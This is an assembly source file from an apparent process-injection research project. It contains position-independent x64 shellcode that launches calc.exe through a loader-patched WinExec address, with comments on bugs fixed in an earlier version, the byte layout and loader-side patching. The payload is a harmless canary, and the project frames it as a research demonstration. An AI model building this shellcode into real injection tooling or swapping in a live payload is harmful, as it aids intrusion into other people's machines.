; StyxLoaderX — Test shellcode: opens calc.exe via WinExec
; =============================================================================
;
; Position-independent shellcode that calls WinExec("calc.exe", SW_SHOW).
;
; This is a TEST PAYLOAD only — a canary that proves the injection worked.
; It is NOT a real payload and must not be replaced with anything else
; without explicit ethics review (see CONTRIBUTING.md).
;
; Background (audit fix F13 / commit 6):
;
; The original shellcode.asm had three compounding bugs:
;   (a) 'mov rax, 0x7C8623AD' used a 32-bit zero-extended immediate. In
;       x64 user space, real kernel32 addresses are in the 0x7FFxxxxxxx
;       range. NASM assembled this as 'mov rax, imm32' (zero-extended),
;       producing rax = 0x000000007C8623AD — an invalid address on x64.
;       The value 0x7C8623AD is the WinExec address in Windows XP SP3
;       32-bit (kernel32 base 0x7C800000), not x64. 'call rax' then
;       jumped to an unmapped address → access violation.
;   (b) The address was hardcoded, so it would not work on any other
;       Windows build (each build has a different kernel32 base due to
;       ASLR).
;   (c) 'mov rcx, calc_str' used absolute addressing — when injected into
;       a remote process at a different address than the assembler
;       assumed, rcx would point to the wrong location. Not
;       position-independent.
;
; This rewrite (decision D10: loader-resolved GetProcAddress):
;   - The first 8 bytes are a placeholder, patched by the loader at
;     runtime with the actual address of WinExec (resolved via
;     GetProcAddress(GetModuleHandle("kernel32.dll"), "WinExec")).
;   - The code is fully position-independent: all data references use
;     RIP-relative addressing ([rel symbol] in NASM, [rip+disp32] in
;     machine code).
;   - The loader knows to patch offset 0 with the WinExec address.
;
; This is a deliberately minimal approach. A more "complete" approach
; (PEB walking + hash lookup for WinExec, like Metasploit
; windows/x64/exec) would cross from "research demonstration" into
; "operational shellcode" — out of scope per CONTRIBUTING.md.
;
; Layout (verified via pwntools asm() on Linux):
;   [0..7]    placeholder (8 bytes, patched by loader with WinExec)
;   [8..14]   mov rax, [rip-15]      ; rax = WinExec (patched)
;   [15..21]  lea rcx, [rip+13]      ; rcx = &cmd_str
;   [22..28]  mov rdx, 5             ; SW_SHOW
;   [29..30]  call rax               ; WinExec(rcx, rdx)
;   [31..33]  xor rax, rax
;   [34]      ret
;   [35..43]  "calc.exe\0"
;
; Build:
;   nasm -f bin shellcode.asm -o shellcode.bin
;
; Loader-side patching (done by SimpleInject/DirectInject/ProcessHollowing
; in src/*.cpp — to be added in a follow-up commit):
;   1. Read shellcode.bin into a buffer.
;   2. Resolve WinExec: GetProcAddress(GetModuleHandleA("kernel32.dll"),
;      "WinExec").
;   3. Patch bytes [0..7] of the buffer with the WinExec address.
;   4. Inject the patched buffer (existing logic).

BITS 64

section .text

global _start

_start:
placeholder:
    dq 0                          ; offset 0: WinExec address (patched by loader)

code_start:
    mov rax, [rel placeholder]    ; rax = WinExec address (RIP-relative)
    lea rcx, [rel cmd_str]        ; rcx = &"calc.exe"
    mov rdx, 5                    ; rdx = SW_SHOW
    call rax                      ; WinExec(rcx, rdx)
    xor rax, rax                  ; return 0
    ret

cmd_str:
    db "calc.exe", 0
